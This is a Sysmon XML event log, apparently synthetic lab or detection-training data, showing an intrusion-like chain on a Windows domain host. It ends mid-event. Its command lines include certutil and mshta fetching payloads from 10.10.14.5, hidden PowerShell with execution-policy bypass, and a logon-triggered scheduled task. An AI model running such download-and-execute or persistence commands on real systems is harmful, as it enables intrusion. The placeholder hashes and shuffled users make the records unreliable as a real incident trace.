<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:04:54.0000000Z" />
      <EventRecordID>5044</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:04:54.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0042-000000000c00}</Data>
      <Data Name="ProcessId">6042</Data>
      <Data Name="Image">C:\Windows\System32\tasklist.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">tasklist.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">tasklist.exe</Data>
      <Data Name="CommandLine">tasklist /v</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\Administrator</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Low</Data>
      <Data Name="Hashes">SHA1=0000002A0000002A0000002A0000002A0000002A,MD5=0000002A0000002A0000002A0000002A,SHA256=0000002A0000002A0000002A0000002A0000002A0000002A0000002A0000002A,IMPHASH=0000002A0000002A0000002A0000002A</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0042-000000000c00}</Data>
      <Data Name="ParentProcessId">5042</Data>
      <Data Name="ParentImage">C:\Windows\System32\reg.exe</Data>
      <Data Name="ParentCommandLine">reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</Data>
      <Data Name="ParentUser">CONDEF\Administrator</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:05:01.0000000Z" />
      <EventRecordID>5045</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:05:01.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0043-000000000c00}</Data>
      <Data Name="ProcessId">6043</Data>
      <Data Name="Image">C:\Windows\System32\reg.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">reg.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">reg.exe</Data>
      <Data Name="CommandLine">reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\jsmith</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">System</Data>
      <Data Name="Hashes">SHA1=0000002B0000002B0000002B0000002B0000002B,MD5=0000002B0000002B0000002B0000002B,SHA256=0000002B0000002B0000002B0000002B0000002B0000002B0000002B0000002B,IMPHASH=0000002B0000002B0000002B0000002B</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0043-000000000c00}</Data>
      <Data Name="ParentProcessId">5043</Data>
      <Data Name="ParentImage">C:\Windows\System32\schtasks.exe</Data>
      <Data Name="ParentCommandLine">schtasks /create /tn Updater /tr C:\Users\Public\upd.exe /sc onlogon</Data>
      <Data Name="ParentUser">CONDEF\jsmith</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:05:08.0000000Z" />
      <EventRecordID>5046</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:05:08.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0044-000000000c00}</Data>
      <Data Name="ProcessId">6044</Data>
      <Data Name="Image">C:\Windows\System32\schtasks.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">schtasks.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">schtasks.exe</Data>
      <Data Name="CommandLine">schtasks /create /tn Updater /tr C:\Users\Public\upd.exe /sc onlogon</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\svc_backup</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">High</Data>
      <Data Name="Hashes">SHA1=0000002C0000002C0000002C0000002C0000002C,MD5=0000002C0000002C0000002C0000002C,SHA256=0000002C0000002C0000002C0000002C0000002C0000002C0000002C0000002C,IMPHASH=0000002C0000002C0000002C0000002C</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0044-000000000c00}</Data>
      <Data Name="ParentProcessId">5044</Data>
      <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
      <Data Name="ParentCommandLine">C:\Windows\Explorer.EXE</Data>
      <Data Name="ParentUser">CONDEF\svc_backup</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:05:15.0000000Z" />
      <EventRecordID>5047</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:05:15.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0045-000000000c00}</Data>
      <Data Name="ProcessId">6045</Data>
      <Data Name="Image">C:\Windows\explorer.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">explorer.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">explorer.exe</Data>
      <Data Name="CommandLine">C:\Windows\Explorer.EXE</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\Administrator</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Medium</Data>
      <Data Name="Hashes">SHA1=0000002D0000002D0000002D0000002D0000002D,MD5=0000002D0000002D0000002D0000002D,SHA256=0000002D0000002D0000002D0000002D0000002D0000002D0000002D0000002D,IMPHASH=0000002D0000002D0000002D0000002D</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0045-000000000c00}</Data>
      <Data Name="ParentProcessId">5045</Data>
      <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
      <Data Name="ParentCommandLine">"C:\WINDOWS\system32\cmd.exe"</Data>
      <Data Name="ParentUser">CONDEF\Administrator</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:05:22.0000000Z" />
      <EventRecordID>5048</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:05:22.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0046-000000000c00}</Data>
      <Data Name="ProcessId">6046</Data>
      <Data Name="Image">C:\Windows\System32\cmd.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">cmd.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">cmd.exe</Data>
      <Data Name="CommandLine">"C:\WINDOWS\system32\cmd.exe"</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\jsmith</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Low</Data>
      <Data Name="Hashes">SHA1=0000002E0000002E0000002E0000002E0000002E,MD5=0000002E0000002E0000002E0000002E,SHA256=0000002E0000002E0000002E0000002E0000002E0000002E0000002E0000002E,IMPHASH=0000002E0000002E0000002E0000002E</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0046-000000000c00}</Data>
      <Data Name="ParentProcessId">5046</Data>
      <Data Name="ParentImage">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name="ParentCommandLine">powershell.exe -nop -w hidden -ep bypass</Data>
      <Data Name="ParentUser">CONDEF\jsmith</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:05:29.0000000Z" />
      <EventRecordID>5049</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:05:29.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0047-000000000c00}</Data>
      <Data Name="ProcessId">6047</Data>
      <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">powershell.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">powershell.exe</Data>
      <Data Name="CommandLine">powershell.exe -nop -w hidden -ep bypass</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\svc_backup</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">System</Data>
      <Data Name="Hashes">SHA1=0000002F0000002F0000002F0000002F0000002F,MD5=0000002F0000002F0000002F0000002F,SHA256=0000002F0000002F0000002F0000002F0000002F0000002F0000002F0000002F,IMPHASH=0000002F0000002F0000002F0000002F</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0047-000000000c00}</Data>
      <Data Name="ParentProcessId">5047</Data>
      <Data Name="ParentImage">C:\Windows\System32\certutil.exe</Data>
      <Data Name="ParentCommandLine">certutil.exe -urlcache -split -f http://10.10.14.5/payload.exe payload.exe</Data>
      <Data Name="ParentUser">CONDEF\svc_backup</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>3</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>3</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:05:30.0000000Z" />
      <EventRecordID>5051</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:05:30.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0047-000000000c00}</Data>
      <Data Name="ProcessId">6047</Data>
      <Data Name="Image">C:\Windows\System32\certutil.exe</Data>
      <Data Name="DestinationIp">10.10.14.5</Data>
      <Data Name="DestinationPort">443</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:05:36.0000000Z" />
      <EventRecordID>5051</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:05:36.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0048-000000000c00}</Data>
      <Data Name="ProcessId">6048</Data>
      <Data Name="Image">C:\Windows\System32\certutil.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">certutil.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">certutil.exe</Data>
      <Data Name="CommandLine">certutil.exe -urlcache -split -f http://10.10.14.5/payload.exe payload.exe</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\Administrator</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">High</Data>
      <Data Name="Hashes">SHA1=0000003000000030000000300000003000000030,MD5=00000030000000300000003000000030,SHA256=0000003000000030000000300000003000000030000000300000003000000030,IMPHASH=00000030000000300000003000000030</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0048-000000000c00}</Data>
      <Data Name="ParentProcessId">5048</Data>
      <Data Name="ParentImage">C:\Windows\System32\whoami.exe</Data>
      <Data Name="ParentCommandLine">whoami /groups</Data>
      <Data Name="ParentUser">CONDEF\Administrator</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:05:43.0000000Z" />
      <EventRecordID>5052</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:05:43.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0049-000000000c00}</Data>
      <Data Name="ProcessId">6049</Data>
      <Data Name="Image">C:\Windows\System32\whoami.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">whoami.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">whoami.exe</Data>
      <Data Name="CommandLine">whoami /groups</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\jsmith</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Medium</Data>
      <Data Name="Hashes">SHA1=0000003100000031000000310000003100000031,MD5=00000031000000310000003100000031,SHA256=0000003100000031000000310000003100000031000000310000003100000031,IMPHASH=00000031000000310000003100000031</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0049-000000000c00}</Data>
      <Data Name="ParentProcessId">5049</Data>
      <Data Name="ParentImage">C:\Windows\System32\notepad.exe</Data>
      <Data Name="ParentCommandLine">notepad.exe C:\Users\jsmith\notes.txt</Data>
      <Data Name="ParentUser">CONDEF\jsmith</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:05:50.0000000Z" />
      <EventRecordID>5053</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:05:50.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0050-000000000c00}</Data>
      <Data Name="ProcessId">6050</Data>
      <Data Name="Image">C:\Windows\System32\notepad.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">notepad.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">notepad.exe</Data>
      <Data Name="CommandLine">notepad.exe C:\Users\jsmith\notes.txt</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\svc_backup</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Low</Data>
      <Data Name="Hashes">SHA1=0000003200000032000000320000003200000032,MD5=00000032000000320000003200000032,SHA256=0000003200000032000000320000003200000032000000320000003200000032,IMPHASH=00000032000000320000003200000032</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0050-000000000c00}</Data>
      <Data Name="ParentProcessId">5050</Data>
      <Data Name="ParentImage">C:\Windows\System32\svchost.exe</Data>
      <Data Name="ParentCommandLine">C:\Windows\system32\svchost.exe -k netsvcs -p</Data>
      <Data Name="ParentUser">CONDEF\svc_backup</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:05:57.0000000Z" />
      <EventRecordID>5054</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:05:57.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0051-000000000c00}</Data>
      <Data Name="ProcessId">6051</Data>
      <Data Name="Image">C:\Windows\System32\svchost.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">svchost.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">svchost.exe</Data>
      <Data Name="CommandLine">C:\Windows\system32\svchost.exe -k netsvcs -p</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\Administrator</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">System</Data>
      <Data Name="Hashes">SHA1=0000003300000033000000330000003300000033,MD5=00000033000000330000003300000033,SHA256=0000003300000033000000330000003300000033000000330000003300000033,IMPHASH=00000033000000330000003300000033</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0051-000000000c00}</Data>
      <Data Name="ParentProcessId">5051</Data>
      <Data Name="ParentImage">C:\Windows\System32\rundll32.exe</Data>
      <Data Name="ParentCommandLine">rundll32.exe C:\Windows\System32\shell32.dll,Control_RunDLL</Data>
      <Data Name="ParentUser">CONDEF\Administrator</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:06:04.0000000Z" />
      <EventRecordID>5055</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:06:04.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0052-000000000c00}</Data>
      <Data Name="ProcessId">6052</Data>
      <Data Name="Image">C:\Windows\System32\rundll32.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">rundll32.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">rundll32.exe</Data>
      <Data Name="CommandLine">rundll32.exe C:\Windows\System32\shell32.dll,Control_RunDLL</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\jsmith</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">High</Data>
      <Data Name="Hashes">SHA1=0000003400000034000000340000003400000034,MD5=00000034000000340000003400000034,SHA256=0000003400000034000000340000003400000034000000340000003400000034,IMPHASH=00000034000000340000003400000034</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0052-000000000c00}</Data>
      <Data Name="ParentProcessId">5052</Data>
      <Data Name="ParentImage">C:\Windows\System32\mshta.exe</Data>
      <Data Name="ParentCommandLine">mshta.exe http://10.10.14.5/payload.hta</Data>
      <Data Name="ParentUser">CONDEF\jsmith</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:06:11.0000000Z" />
      <EventRecordID>5056</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:06:11.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0053-000000000c00}</Data>
      <Data Name="ProcessId">6053</Data>
      <Data Name="Image">C:\Windows\System32\mshta.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">mshta.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">mshta.exe</Data>
      <Data Name="CommandLine">mshta.exe http://10.10.14.5/payload.hta</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\svc_backup</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Medium</Data>
      <Data Name="Hashes">SHA1=0000003500000035000000350000003500000035,MD5=00000035000000350000003500000035,SHA256=0000003500000035000000350000003500000035000000350000003500000035,IMPHASH=00000035000000350000003500000035</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0053-000000000c00}</Data>
      <Data Name="ParentProcessId">5053</Data>
      <Data Name="ParentImage">C:\Windows\System32\wscript.exe</Data>
      <Data Name="ParentCommandLine">wscript.exe //B C:\Users\Public\update.vbs</Data>
      <Data Name="ParentUser">CONDEF\svc_backup</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:06:18.0000000Z" />
      <EventRecordID>5057</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:06:18.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0054-000000000c00}</Data>
      <Data Name="ProcessId">6054</Data>
      <Data Name="Image">C:\Windows\System32\wscript.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">wscript.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">wscript.exe</Data>
      <Data Name="CommandLine">wscript.exe //B C:\Users\Public\update.vbs</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\Administrator</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Low</Data>
